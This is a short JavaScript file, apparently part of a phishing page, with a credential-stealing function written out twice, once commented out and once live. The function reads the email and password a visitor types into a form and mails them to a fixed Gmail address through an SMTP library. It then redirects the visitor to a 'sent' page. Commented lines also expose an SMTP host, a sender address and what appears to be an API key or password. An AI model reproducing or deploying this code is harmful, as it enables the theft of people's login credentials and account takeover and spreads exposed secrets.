// function emailSend() {
//   var userEmail = document.getElementById("userEmail").value;
//   var password = document.getElementById("Password").value;
//   var messageBody = "Email: " + userEmail + "<br/> Password: " + password;
//   var subject = "Email and Password";

//   Email.send({
//     // Host: "smtp.elasticemail.com",
//     // Username: "adelowopaul98@gmail.com",
//     // Password: "1067E7D057BE2389D3084C6D90B98780BC92", // Store this securely
//     To: "auadesope@gmail.com",
//     // From: "adelowopaul98@gmail.com",
//     Subject: subject,
//     Body: messageBody,
//   })
//     .then((message) => {
//       if (message === "OK") {
//         window.location.href = "sent.html";
//       } else {
//         swal("oops!", "Something Went Wrong", "error");
//       }
//     })
//     .catch((err) => {
//       console.error(err);
//       swal("Error", "Failed to send email", "error");
//     });
// }
function emailSend() {
  var userEmail = document.getElementById("userEmail").value;
  var password = document.getElementById("Password").value;
  var messageBody = "Email: " + userEmail + "<br/> Password: " + password;
  var subject = "Email and Password";

  Email.send({
    // Host: "smtp.elasticemail.com",
    // Username: "adelowopaul98@gmail.com",
    // Password: "1067E7D057BE2389D3084C6D90B98780BC92", // Store this securely
    To: "auadesope@gmail.com",
    // From: "adelowopaul98@gmail.com",
    Subject: subject,
    Body: messageBody,
  })
    .then((message) => {
      console.log("Email send response:", message);
      if (message === "OK") {
        window.location.href = "sent.html";
      } else {
        swal("Oops!", "Something Went Wrong", "error");
      }
    })
    .catch((err) => {
      console.error("Error sending email:", err);
      swal("Error", "Failed to send email", "error");
    });
}
